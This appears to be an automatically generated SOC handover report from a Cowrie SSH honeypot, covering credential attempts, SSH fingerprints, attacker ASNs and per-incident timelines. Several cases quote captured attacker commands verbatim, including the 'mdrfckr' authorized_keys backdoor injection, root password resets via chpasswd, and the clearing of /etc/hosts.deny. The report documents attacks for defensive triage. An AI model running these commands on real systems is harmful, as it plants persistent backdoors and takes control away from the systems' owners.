# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-14 |
| **Generated At** | 2026-05-14T10:23:49Z |
| **Shift Time** | 10:23 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **130** |
| Confirmed Threats | **106** |
| False Positives Filtered | **24** (18.5%) |
| Unique Attacker IPs | **40** |
| Countries of Origin | **18** |
| High Severity Cases | **20** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **110** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **35** |
| Unique Credential Pairs | **18** |
| Unique Usernames | **7** |
| Unique Passwords | **18** |
| Successful Auth Pairs | **20** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `345gs5662d34` | 10 |
| `bartek` | 1 |
| `pakchoi` | 1 |
| `GET / HTTP/1.1` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 9 |
| `Ninja123` | 1 |
| `bartek` | 1 |
| `123Qwe123C` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 9 |
| `root` | `Ninja123` | 1 |
| `bartek` | `bartek` | 1 |
| `root` | `123Qwe123C` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Ninja123` | `51.210.243.91` | 2026-05-14T07:01:58 |
| `root` | `3245gs5662d34` | `51.210.243.91` | 2026-05-14T07:02:02 |
| `root` | `123Qwe123C` | `14.103.18.123` | 2026-05-14T07:10:23 |
| `root` | `sonar123` | `103.210.21.178` | 2026-05-14T07:12:23 |
| `root` | `3245gs5662d34` | `103.210.21.178` | 2026-05-14T07:12:26 |
| `root` | `magic7` | `14.103.73.80` | 2026-05-14T07:13:10 |
| `root` | `Volkswagen` | `8.163.56.144` | 2026-05-14T07:29:20 |
| `root` | `3245gs5662d34` | `8.163.56.144` | 2026-05-14T07:29:24 |
| `root` | `sih` | `87.106.173.213` | 2026-05-14T08:11:21 |
| `root` | `3245gs5662d34` | `87.106.173.213` | 2026-05-14T08:11:25 |
| `root` | `shutup` | `197.243.0.62` | 2026-05-14T08:15:06 |
| `root` | `3245gs5662d34` | `197.243.0.62` | 2026-05-14T08:15:12 |
| `root` | `Master@2023` | `109.91.4.177` | 2026-05-14T08:26:45 |
| `root` | `3245gs5662d34` | `109.91.4.177` | 2026-05-14T08:26:50 |
| `root` | `k0n1g@2016` | `94.29.124.154` | 2026-05-14T09:28:59 |
| `root` | `3245gs5662d34` | `94.29.124.154` | 2026-05-14T09:29:05 |
| `root` | `ABcd-1234` | `172.174.72.225` | 2026-05-14T09:30:30 |
| `root` | `3245gs5662d34` | `172.174.72.225` | 2026-05-14T09:30:35 |
| `root` | `tucker` | `152.32.130.144` | 2026-05-14T09:36:51 |
| `root` | `3245gs5662d34` | `152.32.130.144` | 2026-05-14T09:36:55 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **130** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 57 |
| Paramiko (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 34 | 5 |
| `f555226df196...` | Mirai/variant | 18 | 6 |
| `03a80b21afa8...` | Modern SSH client | 5 | 4 |
| `d6729b7f2442...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 34 | 5 | libssh-based |
| `f555226df196...` | libssh | 18 | 6 | Mirai/variant |
| `03a80b21afa8...` | libssh | 5 | 4 | Modern SSH client |
| `d6729b7f2442...` | Paramiko (Python) | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:bp89mjMmBFvN"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.18.123`, `14.103.73.80`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `152.32.130.144`, `103.210.21.178`, `172.174.72.225`, `197.243.0.62`, `87.106.173.213`, `94.29.124.154`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **40** |
| Unique ASNs | **31** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | MEDIUM |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS209334` | Modat B.V. | 1 | HIGH |
| `AS25513` | PJSC Moscow city telephone network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-009d0b8d6814

| Field | Detail |
|---|---|
| **Source IP** | `51.210.243[.]91` |
| **First Seen** | 2026-05-14 07:01 |
| **Last Seen** | 2026-05-14 07:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 07:01:57` | `cowrie.session.connect` |
| `2026-05-14 07:01:57` | `cowrie.client.version` |
| `2026-05-14 07:01:58` | `cowrie.client.kex` |
| `2026-05-14 07:01:58` | `cowrie.login.success` |
| `2026-05-14 07:01:58` | `cowrie.session.params` |
| `2026-05-14 07:01:58` | `cowrie.command.input` |
| `2026-05-14 07:01:58` | `cowrie.command.failed` |
| `2026-05-14 07:01:59` | `cowrie.log.closed` |
| `2026-05-14 07:01:59` | `cowrie.session.params` |
| `2026-05-14 07:01:59` | `cowrie.command.input` |
| `2026-05-14 07:01:59` | `cowrie.session.file_download` |
| `2026-05-14 07:01:59` | `cowrie.log.closed` |
| `2026-05-14 07:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.210.243[.]91` to AbuseIPDB if not already reported
- [ ] Block `51.210.243[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95806711b332

| Field | Detail |
|---|---|
| **Source IP** | `51.210.243[.]91` |
| **First Seen** | 2026-05-14 07:02 |
| **Last Seen** | 2026-05-14 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 07:02:01` | `cowrie.session.connect` |
| `2026-05-14 07:02:01` | `cowrie.client.version` |
| `2026-05-14 07:02:01` | `cowrie.client.kex` |
| `2026-05-14 07:02:02` | `cowrie.login.success` |
| `2026-05-14 07:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.210.243[.]91` to AbuseIPDB if not already reported
- [ ] Block `51.210.243[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcde0aefd164

| Field | Detail |
|---|---|
| **Source IP** | `14.103.18[.]123` |
| **First Seen** | 2026-05-14 07:10 |
| **Last Seen** | 2026-05-14 07:10 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:bp89mjMmBFvN"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 07:10:20` | `cowrie.session.connect` |
| `2026-05-14 07:10:20` | `cowrie.client.version` |
| `2026-05-14 07:10:20` | `cowrie.client.kex` |
| `2026-05-14 07:10:23` | `cowrie.login.success` |
| `2026-05-14 07:10:23` | `cowrie.session.params` |
| `2026-05-14 07:10:23` | `cowrie.command.input` |
| `2026-05-14 07:10:23` | `cowrie.command.failed` |
| `2026-05-14 07:10:23` | `cowrie.log.closed` |
| `2026-05-14 07:10:23` | `cowrie.session.params` |
| `2026-05-14 07:10:23` | `cowrie.command.input` |
| `2026-05-14 07:10:24` | `cowrie.session.file_download` |
| `2026-05-14 07:10:24` | `cowrie.log.closed` |
| `2026-05-14 07:10:36` | `cowrie.session.params` |
| `2026-05-14 07:10:36` | `cowrie.command.input` |
| `2026-05-14 07:10:36` | `cowrie.log.closed` |
| `2026-05-14 07:10:37` | `cowrie.session.params` |
| `2026-05-14 07:10:37` | `cowrie.command.input` |
| `2026-05-14 07:10:37` | `cowrie.log.closed` |
| `2026-05-14 07:10:37` | `cowrie.session.params` |
| `2026-05-14 07:10:37` | `cowrie.command.input` |
| `2026-05-14 07:10:37` | `cowrie.session.file_download` |
| `2026-05-14 07:10:37` | `cowrie.log.closed` |
| `2026-05-14 07:10:38` | `cowrie.session.params` |
| `2026-05-14 07:10:38` | `cowrie.command.input` |
| `2026-05-14 07:10:38` | `cowrie.log.closed` |
| `2026-05-14 07:10:38` | `cowrie.session.params` |
| `2026-05-14 07:10:38` | `cowrie.command.input` |
| `2026-05-14 07:10:38` | `cowrie.log.closed` |
| `2026-05-14 07:10:38` | `cowrie.session.params` |
| `2026-05-14 07:10:38` | `cowrie.command.input` |
| `2026-05-14 07:10:38` | `cowrie.command.input` |
| `2026-05-14 07:10:39` | `cowrie.log.closed` |
| `2026-05-14 07:10:39` | `cowrie.session.params` |
| `2026-05-14 07:10:39` | `cowrie.command.input` |
| `2026-05-14 07:10:39` | `cowrie.log.closed` |
| `2026-05-14 07:10:39` | `cowrie.session.params` |
| `2026-05-14 07:10:39` | `cowrie.command.input` |
| `2026-05-14 07:10:40` | `cowrie.log.closed` |
| `2026-05-14 07:10:40` | `cowrie.session.params` |
| `2026-05-14 07:10:40` | `cowrie.command.input` |
| `2026-05-14 07:10:40` | `cowrie.log.closed` |
| `2026-05-14 07:10:40` | `cowrie.session.params` |
| `2026-05-14 07:10:40` | `cowrie.command.input` |
| `2026-05-14 07:10:41` | `cowrie.log.closed` |
| `2026-05-14 07:10:41` | `cowrie.session.params` |
| `2026-05-14 07:10:41` | `cowrie.command.input` |
| `2026-05-14 07:10:41` | `cowrie.log.closed` |
| `2026-05-14 07:10:41` | `cowrie.session.params` |
| `2026-05-14 07:10:41` | `cowrie.command.input` |
| `2026-05-14 07:10:41` | `cowrie.log.closed` |
| `2026-05-14 07:10:42` | `cowrie.session.params` |
| `2026-05-14 07:10:42` | `cowrie.command.input` |
| `2026-05-14 07:10:42` | `cowrie.log.closed` |
| `2026-05-14 07:10:42` | `cowrie.session.params` |
| `2026-05-14 07:10:42` | `cowrie.command.input` |
| `2026-05-14 07:10:42` | `cowrie.log.closed` |
| `2026-05-14 07:10:43` | `cowrie.session.params` |
| `2026-05-14 07:10:43` | `cowrie.command.input` |
| `2026-05-14 07:10:43` | `cowrie.log.closed` |
| `2026-05-14 07:10:43` | `cowrie.session.params` |
| `2026-05-14 07:10:43` | `cowrie.command.input` |
| `2026-05-14 07:10:43` | `cowrie.log.closed` |
| `2026-05-14 07:10:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.18[.]123` to AbuseIPDB if not already reported
- [ ] Block `14.103.18[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6b891b8eca3

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]178` |
| **First Seen** | 2026-05-14 07:12 |
| **Last Seen** | 2026-05-14 07:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 07:12:23` | `cowrie.session.connect` |
| `2026-05-14 07:12:23` | `cowrie.client.version` |
| `2026-05-14 07:12:23` | `cowrie.client.kex` |
| `2026-05-14 07:12:23` | `cowrie.login.success` |
| `2026-05-14 07:12:24` | `cowrie.session.params` |
| `2026-05-14 07:12:24` | `cowrie.command.input` |
| `2026-05-14 07:12:24` | `cowrie.command.failed` |
| `2026-05-14 07:12:24` | `cowrie.log.closed` |
| `2026-05-14 07:12:24` | `cowrie.session.params` |
| `2026-05-14 07:12:24` | `cowrie.command.input` |
| `2026-05-14 07:12:24` | `cowrie.session.file_download` |
| `2026-05-14 07:12:24` | `cowrie.log.closed` |
| `2026-05-14 07:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5aec56e028

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]178` |
| **First Seen** | 2026-05-14 07:12 |
| **Last Seen** | 2026-05-14 07:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 07:12:26` | `cowrie.session.connect` |
| `2026-05-14 07:12:26` | `cowrie.client.version` |
| `2026-05-14 07:12:26` | `cowrie.client.kex` |
| `2026-05-14 07:12:26` | `cowrie.login.success` |
| `2026-05-14 07:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfd2286720e3

| Field | Detail |
|---|---|
| **Source IP** | `14.103.73[.]80` |
| **First Seen** | 2026-05-14 07:13 |
| **Last Seen** | 2026-05-14 07:13 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:EpLsdjcOrnoh"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 07:13:10` | `cowrie.session.connect` |
| `2026-05-14 07:13:10` | `cowrie.client.version` |
| `2026-05-14 07:13:10` | `cowrie.client.kex` |
| `2026-05-14 07:13:10` | `cowrie.login.success` |
| `2026-05-14 07:13:11` | `cowrie.session.params` |
| `2026-05-14 07:13:11` | `cowrie.command.input` |
| `2026-05-14 07:13:11` | `cowrie.command.failed` |
| `2026-05-14 07:13:11` | `cowrie.log.closed` |
| `2026-05-14 07:13:11` | `cowrie.session.params` |
| `2026-05-14 07:13:11` | `cowrie.command.input` |
| `2026-05-14 07:13:11` | `cowrie.session.file_download` |
| `2026-05-14 07:13:11` | `cowrie.log.closed` |
| `2026-05-14 07:13:21` | `cowrie.session.params` |
| `2026-05-14 07:13:21` | `cowrie.command.input` |
| `2026-05-14 07:13:22` | `cowrie.log.closed` |
| `2026-05-14 07:13:22` | `cowrie.session.params` |
| `2026-05-14 07:13:22` | `cowrie.command.input` |
| `2026-05-14 07:13:22` | `cowrie.log.closed` |
| `2026-05-14 07:13:22` | `cowrie.session.params` |
| `2026-05-14 07:13:22` | `cowrie.command.input` |
| `2026-05-14 07:13:22` | `cowrie.session.file_download` |
| `2026-05-14 07:13:22` | `cowrie.log.closed` |
| `2026-05-14 07:13:23` | `cowrie.session.params` |
| `2026-05-14 07:13:23` | `cowrie.command.input` |
| `2026-05-14 07:13:23` | `cowrie.log.closed` |
| `2026-05-14 07:13:23` | `cowrie.session.params` |
| `2026-05-14 07:13:23` | `cowrie.command.input` |
| `2026-05-14 07:13:23` | `cowrie.log.closed` |
| `2026-05-14 07:13:24` | `cowrie.session.params` |
| `2026-05-14 07:13:24` | `cowrie.command.input` |
| `2026-05-14 07:13:24` | `cowrie.command.input` |
| `2026-05-14 07:13:24` | `cowrie.log.closed` |
| `2026-05-14 07:13:24` | `cowrie.session.params` |
| `2026-05-14 07:13:24` | `cowrie.command.input` |
| `2026-05-14 07:13:24` | `cowrie.log.closed` |
| `2026-05-14 07:13:24` | `cowrie.session.params` |
| `2026-05-14 07:13:24` | `cowrie.command.input` |
| `2026-05-14 07:13:25` | `cowrie.log.closed` |
| `2026-05-14 07:13:25` | `cowrie.session.params` |
| `2026-05-14 07:13:25` | `cowrie.command.input` |
| `2026-05-14 07:13:25` | `cowrie.log.closed` |
| `2026-05-14 07:13:25` | `cowrie.session.params` |
| `2026-05-14 07:13:25` | `cowrie.command.input` |
| `2026-05-14 07:13:25` | `cowrie.log.closed` |
| `2026-05-14 07:13:26` | `cowrie.session.params` |
| `2026-05-14 07:13:26` | `cowrie.command.input` |
| `2026-05-14 07:13:26` | `cowrie.log.closed` |
| `2026-05-14 07:13:26` | `cowrie.session.params` |
| `2026-05-14 07:13:26` | `cowrie.command.input` |
| `2026-05-14 07:13:26` | `cowrie.log.closed` |
| `2026-05-14 07:13:27` | `cowrie.session.params` |
| `2026-05-14 07:13:27` | `cowrie.command.input` |
| `2026-05-14 07:13:27` | `cowrie.log.closed` |
| `2026-05-14 07:13:27` | `cowrie.session.params` |
| `2026-05-14 07:13:27` | `cowrie.command.input` |
| `2026-05-14 07:13:27` | `cowrie.log.closed` |
| `2026-05-14 07:13:27` | `cowrie.session.params` |
| `2026-05-14 07:13:27` | `cowrie.command.input` |
| `2026-05-14 07:13:28` | `cowrie.log.closed` |
| `2026-05-14 07:13:28` | `cowrie.session.params` |
| `2026-05-14 07:13:28` | `cowrie.command.input` |
| `2026-05-14 07:13:28` | `cowrie.log.closed` |
| `2026-05-14 07:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.73[.]80` to AbuseIPDB if not already reported
- [ ] Block `14.103.73[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6665ca766782

| Field | Detail |
|---|---|
| **Source IP** | `87.106.173[.]213` |
| **First Seen** | 2026-05-14 08:11 |
| **Last Seen** | 2026-05-14 08:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 08:11:20` | `cowrie.session.connect` |
| `2026-05-14 08:11:20` | `cowrie.client.version` |
| `2026-05-14 08:11:20` | `cowrie.client.kex` |
| `2026-05-14 08:11:21` | `cowrie.login.success` |
| `2026-05-14 08:11:21` | `cowrie.session.params` |
| `2026-05-14 08:11:21` | `cowrie.command.input` |
| `2026-05-14 08:11:21` | `cowrie.command.failed` |
| `2026-05-14 08:11:22` | `cowrie.log.closed` |
| `2026-05-14 08:11:22` | `cowrie.session.params` |
| `2026-05-14 08:11:22` | `cowrie.command.input` |
| `2026-05-14 08:11:22` | `cowrie.session.file_download` |
| `2026-05-14 08:11:22` | `cowrie.log.closed` |
| `2026-05-14 08:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.173[.]213` to AbuseIPDB if not already reported
- [ ] Block `87.106.173[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
